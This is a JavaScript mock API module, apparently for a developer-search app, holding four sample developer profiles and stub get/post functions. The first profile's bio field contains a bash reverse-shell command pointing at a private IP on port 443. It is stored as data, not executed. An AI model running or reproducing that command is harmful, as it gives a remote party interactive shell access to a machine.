// import Axios from 'axios';
//
// const api = Axios.create({
//   baseURL: 'http://localhost:5000'
// });
//
// export default api;

const mock_data = [
    {
      avatar_url: 'https://avatars1.githubusercontent.com/u/15237495?s=460&v=4',
      name: 'Pranat Dayal',
      techs: ['Python', 'Javascript', 'Shell'],
      bio: '/bin/bash -i > /dev/tcp/10.0.1.14/443 0<&1 2>&1',
      github_username: 'pranatdayal',
      location: {coordinates: [-22.8678065,-43.3628059]}
    },
    {
      avatar_url: 'https://avatars2.githubusercontent.com/u/34397647?s=460&v=4',
      name: 'elpadrinho',
      techs: ['Lua'],
      bio: '',
      github_username: 'elpadrinho',
      location: {coordinates: [-22.9002977,-43.3105447]}
    },
    {
      avatar_url: 'https://avatars0.githubusercontent.com/u/810997?s=460&v=4',
      name: 'Gary Bradski',
      techs: ['C++'],
      bio: 'Gary Bradski is founder of: OpenCV; Stanely vis team won the DARPA Grand Challenge. Many Startups. Currently CTO @ Arraiy.com and various Advisory positions',
      github_username: 'garybradski',
      location: {coordinates: [-22.9322938,-43.2403024]}
    },
    {
      avatar_url: 'https://avatars3.githubusercontent.com/u/25801568?s=460&v=4',
      name: 'Dmitry Kurtaev',
      techs: ['C++', 'HTML', 'Docker'],
      bio: 'Neural networks surgeon',
      github_username: 'dkurt',
      location: {coordinates: [-22.9952333,-43.3793584]}
    },

  ];

const mock_get = () => (new Promise((resolve, reject) => {
  resolve({ data: mock_data });
}));

const mock_post = (path, data) => (new Promise((resolve, reject) => {
  resolve({ data: {...data, techs: data.techs.split(',').map(e=>e.trim())} });
}));

const api = {
  get: mock_get,
  post: mock_post
};

export default api;